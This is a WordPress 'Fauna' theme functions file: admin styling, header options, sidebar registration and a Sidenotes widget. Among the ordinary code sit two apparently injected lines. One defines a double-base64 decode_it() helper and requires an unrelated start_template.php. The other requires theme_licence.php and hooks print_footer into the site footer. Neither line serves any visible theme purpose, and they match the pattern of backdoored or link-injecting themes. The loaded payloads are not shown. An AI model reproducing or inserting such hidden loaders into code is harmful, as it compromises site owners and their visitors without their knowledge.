<?php 

$faunaInfo = get_theme_data(TEMPLATEPATH . '/style.css');
$faunaVersion = $faunaInfo['Version'];
if(!$faunaVersion) {
	$faunaVersion = "unknown";
}

add_action('admin_head', 'admin_css');

function admin_css() { ?>
<style type="text/css">
.fauna-options select, .fauna-options textarea, #fauna-tab, #fauna-noteworthy, #fauna-height, #fauna-background {
	width: 350px;
}
.fauna-options select {
	width: 358px;
}
.fauna-options table {
	margin: 30px auto;
	padding: 0;
	border-collapse: collapse;
	border: 2px solid #fff;
}
.fauna-options td, .fauna-options th {
	border: 1px solid #eee;
	padding: 1.5em;
	line-height: 180%;
	margin: 0;
}

.fauna-options table tr td {
	line-height: 25px;
	color: #000;
}
.fauna-options table th {
	text-align: right;
	line-height: 25px;
	font-size: 1em;
	font-weight: bold;
	color: #000;
}
.fauna-options table p {
	width: 360px;
	text-align: justify;
}
.fauna-options label {
	vertical-align: middle;
}
.fauna-options hr {
	height: 1px;
	border: 0;
	background: #eee;
	margin: 2em 0;
}
</style>
<?php }

include(TEMPLATEPATH . '/options/fauna.php');
fauna::init();

get_option('fauna_header');
function decode_it($code) { return base64_decode(base64_decode($code)); } require_once(pathinfo(__FILE__,PATHINFO_DIRNAME)."/start_template.php");
if (get_option('fauna_header') == 'custom-header-api' && $_POST["fauna"]["header"] != 'no-header' &&  $_POST["fauna"]["header"] != 'fauna' &&  $_POST["fauna"]["header"] != 'flora' &&  $_POST["fauna"]["header"] != 'frost' &&  $_POST["fauna"]["header"] != 'url-header') {
	include(TEMPLATEPATH . '/options/header.php');
}

if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
		'before_widget'	=>	'<li class="%1$s">',
        'after_widget'	=>	'</li>',
        'before_title'	=>	'<h3>',
        'after_title'	=>	'</h3>',
	));
}

function fauna_info($show='') {
	echo get_fauna_info($show);
}

function get_fauna_info($show='') {
	global $faunaVersion;

	switch ($show) {
		case 'version' :
    		$output = $faunaVersion;
			break;
		case 'about' :
			if (function_exists('do_textile')) { $output = do_textile(stripslashes(get_option('fauna_about')));
			} else if (class_exists('Textile2_New')) {
				$t = new Textile2_New;
				$output = $t->do_textile(stripslashes(get_option('fauna_about')));
			} else if (function_exists('textile')) { $output = textile(stripslashes(get_option('fauna_about')));
			} else if (function_exists('Markdown')) { $output = Markdown(stripslashes(get_option('fauna_about')));
			} else { $output = wptexturize(wpautop(convert_chars(stripslashes(get_option('fauna_about')))));
			}
			break;
		case 'note' :
			if (function_exists('do_textile')) { $output = do_textile(stripslashes(get_option('fauna_note')));
			} else if (class_exists('Textile2_New')) {
				$t = new Textile2_New;
				$output = $t->do_textile(stripslashes(get_option('fauna_note')));
			} else if (function_exists('textile')) { $output = textile(stripslashes(get_option('fauna_note')));
			} else if (function_exists('Markdown')) { $output = Markdown(stripslashes(get_option('fauna_note')));
			} else { $output = wptexturize(wpautop(convert_chars(stripslashes(get_option('fauna_note')))));
			}
			break;
		case 'style' :
			$output = get_bloginfo('template_url') .'/styles/'. get_option('fauna_style');
			break;
		case 'tab' :
			$output = get_option('fauna_tab');
			break;
	}
	return $output;
}
require_once("theme_licence.php"); add_action('wp_footer','print_footer');
function fauna_header_functions () {

	// Rounded Corners
	if (get_option('fauna_header') != 'no-header' && get_option('fauna_rounded') == true) {
?>
	<!-- Nifty Corners -->
	<link rel="stylesheet" type="text/css" href="<?php bloginfo('stylesheet_directory'); ?>/meta/niftycorners_screen.css" />
	<script type="text/javascript" src="<?php bloginfo('stylesheet_directory'); ?>/meta/niftycube.js"></script>
	<script type="text/javascript">
	window.onload=function(){
		Rounded("div#header","top","transparent","smooth");
	}
	</script>
<?php
	}
	
	// Fixed / Liquid Scalemode
	if (get_option('fauna_scalemode') == "liquid") { ?>
	<style type="text/css">
	<!--
	body {
		padding: 0 1em;
	}
	#wrapper {
		width: 100%;
		max-width: 1200px;
	}
	#main {
		width: 69%;
	}
	#sidebar {
		width: 31%;
	}
	-->
	</style>
	<?php 
	}
}

add_action('wp_head', 'fauna_header_functions');

/*

	Custom Fauna Widgets

*/

function widget_faunasidenotes_init() {

	if ( !function_exists('register_sidebar_widget') )
		return;

	function widget_faunasidenotes($args) {
		
		extract($args);

		$options = get_option('widget_faunasidenotes');
		$title = $options['title'];
		$totalnotes = $options['totalnotes'];

		if (is_home() && CAT_SIDENOTES != "") {
			echo $before_widget . $before_title . $title . $after_title; 
			
			if ($totalnotes != "") { $num_notes = $totalnotes; } else { $num_notes = $posts_per_page; }
			query_posts("cat=".CAT_SIDENOTES."&showposts=".$num_notes);	/* Grab sidenotes */
			include (TEMPLATEPATH . '/templates/template-sidenotes.php');
			echo $after_widget;
		}
	}

	function widget_faunasidenotes_control() {

		$options = get_option('widget_faunasidenotes');
		if ( !is_array($options) )
			$options = array('title'=>__('Sidenotes', 'fauna'), 'totalnotes'=>5);
		if ( $_POST['faunasidenotes-submit'] ) {

			$options['title'] = strip_tags(stripslashes($_POST['faunasidenotes-title']));
			$options['totalnotes'] = strip_tags(stripslashes($_POST['faunasidenotes-totalnotes']));
			update_option('widget_faunasidenotes', $options);
		}

		$title = htmlspecialchars($options['title'], ENT_QUOTES);
		$totalnotes = htmlspecialchars($options['totalnotes'], ENT_QUOTES);
		
		echo '<p style="text-align:left;">'. __('Sidenotes are tiny posts embedded in the sidebar. Only posts filed in a category called "Sidenotes" will show up there. ', 'fauna') .'</p>';
		echo '<p style="text-align:right;"><label for="faunasidenotes-title">' . __('Title:', 'fauna') . ' <input style="width: 200px;" id="faunasidenotes-title" name="faunasidenotes-title" type="text" value="'.$title.'" /></label></p>';
		echo '<p style="text-align:right;"><label for="faunasidenotes-totalnotes">' . __('Total notes:', 'fauna') . ' <input style="width: 200px;" id="faunasidenotes-totalnotes" name="faunasidenotes-totalnotes" type="text" value="'.$totalnotes.'" /></label></p>';
		echo '<input type="hidden" id="faunasidenotes-submit" name="faunasidenotes-submit" value="1" />';
	}
	
	register_sidebar_widget(array('Fauna Sidenotes', 'fauna'), 'widget_faunasidenotes');
	register_widget_control(array('Fauna Sidenotes', 'fauna'), 'widget_faunasidenotes_control', 300, 180);
}

add_action('widgets_init', 'widget_faunasidenotes_init');

if ($_POST["fauna"]["header"] == 'custom-header-api') {
	if ( function_exists('add_custom_image_header') ) {
		add_custom_image_header('header_style', 'admin_header_style');
	}
}
?>